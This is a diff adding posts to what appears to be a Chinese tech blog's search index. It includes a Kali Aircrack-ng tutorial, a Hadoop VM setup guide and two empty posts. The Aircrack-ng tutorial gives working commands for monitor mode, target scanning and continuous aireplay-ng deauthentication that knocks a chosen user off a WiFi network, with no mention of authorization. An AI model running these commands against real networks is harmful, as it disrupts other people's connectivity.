@@ -4,6 +4,92 @@
   
     
     <entry>
+      <title>使用kali的Aircrack-ng使wifi用户断网测试</title>
+      <link href="/posts/d926/"/>
+      <url>/posts/d926/</url>
+      
+        <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><ul><li>使用VMware虚拟环境安装kali</li><li>一张支持监听的网卡(可以USB网卡)</li></ul><h1 id="插入网卡"><a href="#插入网卡" class="headerlink" title="插入网卡"></a>插入网卡</h1><h2 id="连接虚拟机"><a href="#连接虚拟机" class="headerlink" title="连接虚拟机"></a>连接虚拟机</h2><p><img src="https://pic.ziyuan.wang/2023/10/15/lvettk_56d691ead76ea.png"></p><p>连接虚拟机后把USB网卡拔了再插一次，不重新插拔后续扫描wifi可能扫描不出来</p><p>网卡再次插上后就默认连接虚拟机了，不要在VMware里再次点击网卡连接</p><h2 id="测试网卡是否支持监听"><a href="#测试网卡是否支持监听" class="headerlink" title="测试网卡是否支持监听"></a>测试网卡是否支持监听</h2><p>新建终端输入命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng</span><br></pre></td></tr></table></figure><p>如果你的网卡支持Aircrack-ng就会显示出来</p><p><img src="https://pic.ziyuan.wang/2023/10/15/lvettk_5ff07f439346a.png"></p><h2 id="开启监听模式"><a href="#开启监听模式" class="headerlink" title="开启监听模式"></a>开启监听模式</h2><p>清除干扰进程</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng check kill</span><br></pre></td></tr></table></figure><p>开启监听</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure><h2 id="扫描wifi信号"><a href="#扫描wifi信号" class="headerlink" title="扫描wifi信号"></a>扫描wifi信号</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p><img src="https://pic.ziyuan.wang/2023/10/15/lvettk_95c25e6491c32.png"></p><p>当你扫描到你想攻击的wifi时按下<code>CTRL + C</code>停止扫描，并记下wifi信息</p><p>参数解释</p><ul><li>PWR 信号强弱</li><li>BSSID wifi的mac地址</li><li>CH wifi的信道</li><li>ESSID wifi名</li></ul><h2 id="扫描连接wifi的用户"><a href="#扫描连接wifi的用户" class="headerlink" title="扫描连接wifi的用户"></a>扫描连接wifi的用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">airodump-ng -c 7 --bssid 3C:E3:E7:61:AF:2F wlan0mon</span><br></pre></td></tr></table></figure><p>参数解释</p><ul><li>-c 要扫描的wifi的信道</li><li>–bassid 要扫描的wifi的mac地址</li></ul><p><img src="https://pic.ziyuan.wang/2023/10/15/lvettk_475dd868b88f1.png"></p><p>参数解释</p><ul><li>BSSID wifi的mac地址</li><li>STATION 用户的mac地址</li></ul><h2 id="攻击用户使用户掉线"><a href="#攻击用户使用户掉线" class="headerlink" title="攻击用户使用户掉线"></a>攻击用户使用户掉线</h2><p>再开一个终端输入命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aireplay-ng -0 0 -c 18:CC:18:AA:29:E5 -a 36:00:97:E9:FB:CC wlan0mon</span><br></pre></td></tr></table></figure><p>参数解释</p><ul><li>-0 表示攻击几次，0代表一直攻击</li><li>-c 用户的mac地址</li><li>-a wifi的mac地址</li></ul><p><strong>成功！！！</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> kali </tag>
+            
+            <tag> Aircrack-ng </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> wifi </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hadoop本地集群部署(一)</title>
+      <link href="/posts/88c3/"/>
+      <url>/posts/88c3/</url>
+      
+        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><hr><blockquote><ul><li>如果你打算在云服务器上搭建hadoop集群，那么你需要保证每台云服务器都有独立的公网ip</li></ul></blockquote><blockquote><ul><li>如果你打算在本地安转hadoop集群，即多台服务器公用一个公网IP，那么你的集群是无法直接在公网被使用的，你会遇到如下问题：</li></ul><p>web访问hdfs下载文件时，浏览器链接会跳转到该文件所在的datanode的内网ip，从而导致访问失败，上传文件时也有同样问题</p><p>解决办法，在某个服务器上自写框架调用hadoop集群，即通过公网的一个端口实现hadoop全部功能的使用</p></blockquote><h1 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h1><p><a href="https://www.vmware.com/">VMware官网</a>  下载VMware</p><p><a href="https://mirrors.tuna.tsinghua.edu.cn/centos/7.9.2009/isos/x86_64/CentOS-7-x86_64-DVD-2009.iso">CentOS-7-x86_64-DVD-2009.iso</a>  下载centos7镜像</p><h1 id="安装虚拟机"><a href="#安装虚拟机" class="headerlink" title="安装虚拟机"></a>安装虚拟机</h1><p>按照图示即可</p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_968ba02bc4cd1.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_e407c694a7473.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_3419e702ef0b1.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_bd0a79d69e2d3.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_1a7d70496783f.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_5f70875171826.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_43c8c00cb2a8b.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_41974d601ed72.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_791079f3ee029.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_12bc6b942309a.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_4836b373a1bb4.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_3ad572d449e55.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_ee5a64bb266f0.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_7eea3b782fe67.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_bce893e1759c4.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_8c93edac48f17.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_fb2718a8a8930.png"></p><p><img src="https://pic.ziyuan.wang/2023/10/13/lvettk_dec2a5b6e8911.png"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> hadoop </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> hadoop </tag>
+            
+            <tag> Vmware </tag>
+            
+            <tag> 大数据 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>QQ机器人搭建教程</title>
+      <link href="/posts/2ef6/"/>
+      <url>/posts/2ef6/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hadoop环境配置</title>
+      <link href="/posts/aa93/"/>
+      <url>/posts/aa93/</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>vi编辑器教程</title>
       <link href="/posts/5901/"/>
       <url>/posts/5901/</url>
